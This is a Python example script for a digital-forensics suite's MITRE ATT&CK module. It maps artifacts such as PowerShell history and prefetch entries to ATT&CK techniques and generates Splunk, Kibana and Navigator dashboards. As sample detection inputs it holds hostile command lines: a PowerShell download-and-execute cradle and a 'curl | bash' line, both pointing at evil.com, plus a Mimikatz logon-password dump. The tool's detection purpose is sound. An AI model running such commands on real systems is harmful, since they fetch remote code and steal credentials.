#!/usr/bin/env python3
"""
MITRE ATT&CK Module Examples

Demonstrates usage of the MITRE ATT&CK integration module.

Author: Rowanholt DF Acceleration Suite
Version: 2.1.0
"""

import json
from pathlib import Path

from analysis.mitre import MitreAttackUpdater, TechniqueMapper, MitreDashboardGenerator


def example_1_basic_update():
    """Example 1: Update ATT&CK framework data."""
    print("=" * 60)
    print("Example 1: Update ATT&CK Framework Data")
    print("=" * 60 + "\n")

    updater = MitreAttackUpdater()

    print("[*] Checking for ATT&CK updates...")
    success = updater.update_local_cache()

    if success:
        data = updater.load_cached_data()
        print(f"[+] ATT&CK data updated successfully")
        print(f"    Version: {data.get('version', 'unknown')}")
        print(f"    Techniques: {len(data.get('techniques', {}))}")
        print(f"    Tactics: {len(data.get('tactics', {}))}")
        print(f"    Groups: {len(data.get('groups', {}))}")
        print(f"    Software: {len(data.get('software', {}))}")
    else:
        print("[-] Failed to update ATT&CK data")

    print()


def example_2_simple_mapping():
    """Example 2: Map a single artifact to techniques."""
    print("=" * 60)
    print("Example 2: Simple Artifact Mapping")
    print("=" * 60 + "\n")

    mapper = TechniqueMapper()

    # Map PowerShell history artifact
    print("[*] Mapping PowerShell history artifact...")
    techniques = mapper.map_artifact_to_techniques("powershell_history")

    print(f"[+] Found {len(techniques)} technique(s):\n")
    for tech in techniques:
        print(f"  {tech['id']}: {tech['name']}")
        print(f"    Confidence: {tech['confidence']:.2f}")
        print(f"    Tactics: {', '.join(tech['tactics'])}")
        print()


def example_3_context_aware_mapping():
    """Example 3: Context-aware technique mapping."""
    print("=" * 60)
    print("Example 3: Context-Aware Mapping")
    print("=" * 60 + "\n")

    mapper = TechniqueMapper()

    # Map PowerShell with suspicious command
    context = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"

    print(f"[*] Analyzing PowerShell command:")
    print(f"    {context}\n")

    techniques = mapper.map_artifact_to_techniques(
        artifact_type="powershell_history", context=context
    )

    print(f"[+] Detected {len(techniques)} technique(s):\n")
    for tech in sorted(techniques, key=lambda x: x["confidence"], reverse=True):
        print(f"  {tech['id']}: {tech['name']}")
        print(f"    Confidence: {tech['confidence']:.2f}")
        print(f"    Tactics: {', '.join(tech['tactics'])}")

        # Show why this was detected
        factors = tech.get("confidence_factors", {})
        if "context" in factors and factors["context"] > 0:
            print(f"    Context match: +{factors['context']:.2f}")

        print()


def example_4_data_aware_mapping():
    """Example 4: Data-aware technique mapping."""
    print("=" * 60)
    print("Example 4: Data-Aware Mapping")
    print("=" * 60 + "\n")

    mapper = TechniqueMapper()

    # Map prefetch with known malicious tool
    artifact_data = {"filename": "MIMIKATZ.EXE", "run_count": 5, "last_run": "2025-01-15T10:30:00Z"}

    print(f"[*] Analyzing prefetch artifact:")
    print(f"    Filename: {artifact_data['filename']}\n")

    techniques = mapper.map_artifact_to_techniques(
        artifact_type="prefetch", artifact_data=artifact_data
    )

    print(f"[+] Detected {len(techniques)} technique(s):\n")
    for tech in sorted(techniques, key=lambda x: x["confidence"], reverse=True):
        print(f"  {tech['id']}: {tech['name']}")
        print(f"    Confidence: {tech['confidence']:.2f}")
        print(f"    Tactics: {', '.join(tech['tactics'])}")
        print()


def example_5_batch_mapping():
    """Example 5: Batch artifact mapping."""
    print("=" * 60)
    print("Example 5: Batch Artifact Mapping")
    print("=" * 60 + "\n")

    mapper = TechniqueMapper()

    # Multiple artifacts from an investigation
    artifacts = [
        {
            "type": "powershell_history",
            "context": 'Invoke-Mimikatz -Command "sekurlsa::logonpasswords"',
        },
        {"type": "prefetch", "data": {"filename": "psexec.exe"}},
        {
            "type": "scheduled_tasks",
            "data": {"task_name": "UpdateCheck", "action": "powershell.exe -enc ..."},
        },
        {
            "type": "registry_run_keys",
            "data": {"key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
        },
    ]

    all_techniques = {}

    print(f"[*] Analyzing {len(artifacts)} artifacts...\n")

    for artifact in artifacts:
        techniques = mapper.map_artifact_to_techniques(
            artifact_type=artifact["type"],
            artifact_data=artifact.get("data"),
            context=artifact.get("context"),
        )

        # Deduplicate and keep highest confidence
        for tech in techniques:
            tech_id = tech["id"]
            if (
                tech_id not in all_techniques
                or tech["confidence"] > all_techniques[tech_id]["confidence"]
            ):
                all_techniques[tech_id] = tech

    print(f"[+] Total unique techniques detected: {len(all_techniques)}\n")

    # Show top 5 by confidence
    top_techniques = sorted(all_techniques.values(), key=lambda x: x["confidence"], reverse=True)[
        :5
    ]

    print("Top 5 techniques by confidence:\n")
    for i, tech in enumerate(top_techniques, 1):
        print(f"  {i}. {tech['id']}: {tech['name']}")
        print(f"     Confidence: {tech['confidence']:.2f}")
        print(f"     Tactics: {', '.join(tech['tactics'])}")
        print()


def example_6_generate_dashboards():
    """Example 6: Generate MITRE coverage dashboards."""
    print("=" * 60)
    print("Example 6: Generate Coverage Dashboards")
    print("=" * 60 + "\n")

    mapper = TechniqueMapper()
    generator = MitreDashboardGenerator()

    # Map multiple artifacts
    artifacts = [
        ("powershell_history", "Invoke-Mimikatz"),
        ("prefetch", None),
        ("scheduled_tasks", None),
        ("registry_run_keys", None),
        ("bash_history", "curl http://evil.com | bash"),
    ]

    all_techniques = []

    print("[*] Mapping artifacts to techniques...\n")
    for artifact_type, context in artifacts:
        techniques = mapper.map_artifact_to_techniques(artifact_type, context=context)
        all_techniques.extend(techniques)
        print(f"  {artifact_type}: {len(techniques)} technique(s)")

    # Generate dashboards
    output_dir = "/tmp/rowanholt_mitre_examples"

    print(f"\n[*] Generating dashboards in {output_dir}...\n")

    result = generator.save_dashboards(technique_mappings=all_techniques, output_dir=output_dir)

    print(f"[+] Dashboards generated:\n")
    if "splunk" in result:
        print(f"  Splunk XML: {result['splunk']}")
    if "elastic" in result:
        print(f"  Kibana JSON: {result['elastic']}")
    if "navigator" in result:
        print(f"  Navigator layer: {result['navigator']}")
    if "statistics" in result:
        print(f"  Statistics: {result['statistics']}")

    # Show coverage statistics
    coverage = generator._calculate_coverage(all_techniques)
    stats = coverage["statistics"]

    print(f"\n[*] Coverage Statistics:\n")
    print(f"  Total techniques: {stats['total_techniques']}")
    print(f"  Detected techniques: {stats['detected_techniques']}")
    print(f"  Coverage: {stats['coverage_percentage']:.1f}%")
    print(f"  High confidence: {stats['confidence_distribution']['high']}")
    print(f"  Medium confidence: {stats['confidence_distribution']['medium']}")
    print(f"  Low confidence: {stats['confidence_distribution']['low']}")
    print()


def example_7_get_technique_info():
    """Example 7: Get detailed technique information."""
    print("=" * 60)
    print("Example 7: Get Technique Information")
    print("=" * 60 + "\n")

    updater = MitreAttackUpdater()
    data = updater.load_cached_data()

    if not data:
        print("[-] No ATT&CK data available. Run update first.")
        return

    technique_id = "T1059.001"
    technique = data["techniques"].get(technique_id)

    if technique:
        print(f"[+] {technique['id']}: {technique['name']}\n")
        print(f"Description:")
        print(f"  {technique.get('description', 'N/A')}\n")
        print(f"Tactics: {', '.join(technique.get('tactics', []))}")
        print(f"Platforms: {', '.join(technique.get('platforms', []))}")
        print(f"URL: {technique.get('url', 'N/A')}")
    else:
        print(f"[-] Technique {technique_id} not found")

    print()


def example_8_custom_mapping():
    """Example 8: Add custom artifact mapping."""
    print("=" * 60)
    print("Example 8: Custom Artifact Mapping")
    print("=" * 60 + "\n")

    mapper = TechniqueMapper()

    # Add custom mapping for your organization's specific artifacts
    print("[*] Adding custom mapping for 'custom_tool_log'...")

    mapper.add_custom_mapping(
        artifact_type="custom_tool_log", technique_id="T1059.001", confidence=0.85  # PowerShell
    )

    mapper.add_custom_mapping(
        artifact_type="custom_tool_log",
        technique_id="T1105",  # Ingress Tool Transfer
        confidence=0.75,
    )

    print("[+] Custom mappings added\n")

    # Now map the custom artifact
    techniques = mapper.map_artifact_to_techniques("custom_tool_log")

    print(f"[+] Custom artifact mapped to {len(techniques)} technique(s):\n")
    for tech in techniques:
        print(f"  {tech['id']}: {tech['name']}")
        print(f"    Confidence: {tech['confidence']:.2f}")
        print()


def main():
    """Run all examples."""
    print("\n")
    print("╔" + "═" * 58 + "╗")
    print("║" + " " * 10 + "MITRE ATT&CK Module Examples" + " " * 20 + "║")
    print("╚" + "═" * 58 + "╝")
    print("\n")

    examples = [
        example_1_basic_update,
        example_2_simple_mapping,
        example_3_context_aware_mapping,
        example_4_data_aware_mapping,
        example_5_batch_mapping,
        example_6_generate_dashboards,
        example_7_get_technique_info,
        example_8_custom_mapping,
    ]

    for i, example in enumerate(examples, 1):
        try:
            example()
        except Exception as e:
            print(f"\n[!] Error in example {i}: {e}\n")

        # Pause between examples
        if i < len(examples):
            input("Press Enter to continue to next example...\n")

    print("=" * 60)
    print("All examples completed!")
    print("=" * 60)
    print()


if __name__ == "__main__":
    main()
